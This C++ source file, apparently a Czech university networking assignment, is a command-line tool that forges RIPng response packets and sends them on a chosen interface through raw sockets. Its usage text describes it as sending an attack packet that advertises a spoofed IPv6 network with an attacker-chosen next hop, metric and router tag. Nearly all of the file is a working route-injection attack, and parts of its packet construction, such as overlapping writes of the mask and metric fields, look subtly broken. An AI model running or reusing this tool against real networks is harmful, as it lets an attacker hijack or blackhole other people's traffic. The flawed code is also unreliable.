#include <iostream>
#include <getopt.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <ifaddrs.h>

/*
    Hynek Bernard
    xberna16

 */
/*Kód pro výpočet checksum, funkce byla přejata z minulého projektu do předmětu ISA - DHCP Starvation*/
void checksum(u_char *out, u_char *addr ,int length)
{
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)addr;

    // Initialise the accumulator.
    uint64_t acc=0xffff;

    // Handle any partial block at the start of the data.
    unsigned int offset=((uintptr_t)data)&3;
    if (offset) {
        size_t count=4-offset;
        if (count>length) count=length;
        uint32_t word=0;
        memcpy(offset+(char*)&word,data,count);
        acc+=ntohl(word);
        data+=count;
        length-=count;
    }

    // Handle any complete 32-bit blocks.
    char* data_end=data+(length&~3);
    while (data!=data_end) {
        uint32_t word;
        memcpy(&word,data,4);
        acc+=ntohl(word);
        data+=4;
    }
    length&=3;

    // Handle any partial block at the end of the data.
    if (length) {
        uint32_t word=0;
        memcpy(&word,data,length);
        acc+=ntohl(word);
    }

    // Handle deferred carries.
    acc=(acc&0xffffffff)+(acc>>32);
    while (acc>>16) {
        acc=(acc&0xffff)+(acc>>16);
    }

    // If the data began at an odd byte address
    // then reverse the byte order to compensate.
    if (offset&1) {
        acc=((acc&0xff00)>>8)|((acc&0x00ff)<<8);
    }

    // Return the checksum in network byte order.
    *(u_short *) out = htons(~acc);

}

void fillPacket(in6_addr faddr, sockaddr_in6 *ifa, ifreq ifr ,unsigned short mask,in6_addr fnHop,unsigned short metric,unsigned short routerTag,u_char packet[], int length )
{
    //DSTMAC
    packet[0] = 0x33;
    packet[1] = 0x33;
    memset(&packet[2],0,sizeof(u_char)*3);
    packet[5] = 0x09;

    //SRCMAC
    memcpy(&packet[6], &ifr.ifr_addr.sa_data ,sizeof(ifr.ifr_addr));

    //region IPHEAD
    packet[12]=0x86;
    packet[13]=0xdd;
    packet[14]=0x60;
    memset(&packet[15],0,sizeof(u_char)*4);
    //PAYLOAD LENGTH
    packet[19] = 0x34;
    //NEXT UDP
    packet[20] = 0x11;
    //HOP LIMIT
    packet[21] = 0xff;
    //SRC IP
    memcpy(&packet[22],&ifa->sin6_addr,sizeof(ifa->sin6_addr));
    //DST IP
    packet[38] = 0xff;
    packet[39] =0x02;
    memset(&packet[40],0,sizeof(u_char)*16);
    packet[53]=0x09;
    //endregion
    //region UDP
    //SRC port
    packet[54] = 0x02;
    packet[55] = 0x09;
    //DST port
    memcpy(&packet[56],&packet[54],sizeof(u_char)*2);
    //length
    packet[58]=0x00;
    packet[59]=0x34;
    //endregion

    //region RIPng
    packet[62]=0x02;
    packet[63]=0x01;
    memset(&packet[64],0,sizeof(u_char)*2);
    //entry - NEXT HOP
    //IP addr
    memcpy(&packet[66],&fnHop,sizeof(fnHop));
    memset(&packet[82],0,sizeof(u_char)*3);
    packet[85] = 0xFF;
    //entry
    memcpy(&packet[86],&faddr,sizeof(faddr));
    *((unsigned short*)&packet[102]) = htons(routerTag);
    *((unsigned short*)&packet[104]) = mask;
    *((unsigned short*)&packet[105]) = metric;

    //endregion


    //CHECKSUM
    memset(&packet[60],0,sizeof(u_char)*2);
    packet[20] = 0x00;
    packet[21] = 0x00;
    packet[107] = 0x11;
    checksum(&packet[60], &packet[18],105-15);
    packet[20] = 0x11;
    packet[21] = 0xFF;
}





int main(int argc, char * argv[]) {
    int c,sockfd;
    std::string iFace;
    std::string addr;
    std::string nHop;
    unsigned short mask =0;
    struct in6_addr faddr;
    struct in6_addr fnHop;
    unsigned short metric = 1;
    unsigned short routerTag=0;
    struct ifreq ifr;
    struct sockaddr_ll device;
    struct ifaddrs *ifa;
    u_char packet[1000];
    memset(packet,0,sizeof(packet));
    bool args[6] = {false,false,false,false,false,true}; // -i| -r| -n| -m| -t| správné parametry|
    //region param check
    while((c= getopt(argc, argv, "i:r:n:m:t:")) != -1)
    {
        switch(c)
        {
            case 'i':
                if(args[0] || !optarg)
                {
                    args[5]=false;
                }
                args[0] = true;
                iFace = optarg;
                break;
            case 'r':
                if(args[1] || !optarg)
                {
                    args[5]=false;
                }
                args[1] = true;
                addr = optarg;
                break;
            case 'n':
                if(args[2] || !optarg)
                {
                    args[5]=false;
                }
                args[2] = true;
                nHop = optarg;
                break;
            case 'm':
                if(args[3] || !optarg)
                {
                    args[5]=false;
                }
                args[3] = true;
                metric = atoi(optarg);
                break;
            case 't':
                if(args[4] || !optarg)
                {
                    args[5]=false;
                }
                args[4] = true;
                routerTag = atoi(optarg);
                break;
            case '?':
                args[5]=false;
                break;
        }
    }
    if (!args[5] || metric < 0 || metric > 16 || routerTag < 0 || routerTag > 65535 || !args[0] || !args[1])
    {
        printf("Použití: ./myripresponse -i <rozhraní> -r <IPv6>/[16-128] {-n <IPv6>} {-m [0-16]} {-t [0-65535]}\n"
                       "* -i: <rozhraní> udává rozhraní, ze kterého má být útočný paket odeslán;\n"
                       "* -r: v <IPv6> je IP adresa podvrhávané sítě a za lomítkem číselná délka masky sítě;\n"
                       "* -m: následující číslo udává RIP Metriku, tedy počet hopů, implicitně 1;\n"
                       "* -n: <IPv6> za tímto parametrem je adresa next-hopu pro podvrhávanou routu, implicitně ::;\n"
                       "* -t: číslo udává hodnotu Router Tagu, implicitně 0.");
        exit(2);
    }
    if (!args[2])
        nHop = "::";
    if(addr.find('/') == std::string::npos || inet_pton(AF_INET6, addr.substr(0,addr.find('/')).c_str(), &faddr)!=1)
    {
        printf("Špatný formát zadané adresy parametru -r");
        exit(2);
    }
    mask = atoi(addr.substr(addr.find('/')+1).c_str());
    if (mask>128 ||mask<16)
    {
        printf("Špatně zadaná délka masky sítě");
        exit(2);
    }
    if(inet_pton(AF_INET6, nHop.c_str(), &fnHop)!=1)
    {
        printf("Špatný formát zadané adresy parametru -n");
        exit(2);
    }
    //endregion
    //END OF PARAMETER CHECK
    //region GET
    //GET MAC

    if ((sockfd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)) == -1) {
        printf("Nepodařilo se otevřít socket: %d \n", errno);
        exit(1);
    }
    memset (&ifr, 0, sizeof (ifr));
    snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", iFace.c_str());
    if (ioctl(sockfd,SIOCGIFHWADDR, &ifr)<0)
    {
        printf("Nepodařilo se získat MAC interface: %d %s\n", errno, iFace.c_str());
        exit(1);
    }
    close(sockfd);

    //GET INTERFACE INDEX

    memset (&device, 0, sizeof (device));
    if ((device.sll_ifindex = if_nametoindex (iFace.c_str())) == 0) {
        printf("Nepodařilo se získat index interface %s",iFace.c_str());
        exit (1);
    }

    //GET IF IP (potřebujeme Link local)
    if (getifaddrs(&ifa) == -1) {
        printf("Nepodařilo se získat adresy zařízení (máte práva?).");
        exit(1);
    }
    struct sockaddr_in6 *in6 ;
    while (ifa)
    {
        if (strcmp(ifa->ifa_name,iFace.c_str()) == 0)
        {
            in6 = (struct sockaddr_in6*) ifa->ifa_addr;
            if (ifa->ifa_addr->sa_family == AF_INET6 && in6->sin6_addr.__in6_u.__u6_addr8[0]==254) {
                break;
            }
        }
        ifa = ifa->ifa_next;
    }
    if (ifa == NULL)
    {
        printf("Program nenalezl žádnou link local adresu na zařízení %s",iFace.c_str());
        exit(1);
    }

    //endregion
    //Vyplní packet podle parametrů
    fillPacket(faddr, in6,ifr,mask ,fnHop, metric, routerTag, packet,1000);
    //Otevřeme socket

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
        printf("Nepodařilo se otevřít socket: %d \n", errno);
        exit(1);
    }
    //Nastavíme parametry pro zařízení na které odesíláme packet
    device.sll_family = AF_PACKET;
    device.sll_halen = 6;
    memcpy(device.sll_addr, ifr.ifr_ifru.ifru_addr.sa_data,sizeof(char)*6);
    //Odešleme packet
    if ((sendto(sockfd, packet, 106, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
        perror ("sendto() selhalo");
        exit (EXIT_FAILURE);
    }
    //Úklid socketu a konec
    close (sockfd);
    return 0;
}
